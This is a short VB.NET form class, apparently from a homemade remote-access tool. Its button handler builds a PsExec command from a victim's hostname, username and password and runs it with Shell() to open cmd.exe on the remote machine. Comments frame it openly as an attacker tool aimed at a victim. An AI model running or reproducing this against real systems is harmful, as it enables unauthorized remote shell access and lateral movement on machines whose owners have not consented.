Public Class cmd
    Public hostname As String
    Public username As String
    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        'before use the cmd , we need download psexec.exe in the attacker computer
        'specify the psexec.exe path and follow by the host name of the victim
        '-u - set the victim username
        '-p - and the password of the victim
        'cmd.exe to start the cmd
        Dim path As String = "C:\Users\Romeo VaVa\Downloads\PsExec.exe \\" + hostname + " -u """ + username + """ -p password cmd.exe"
        'execute the command by using shell
        Shell(path)

    End Sub
End Class
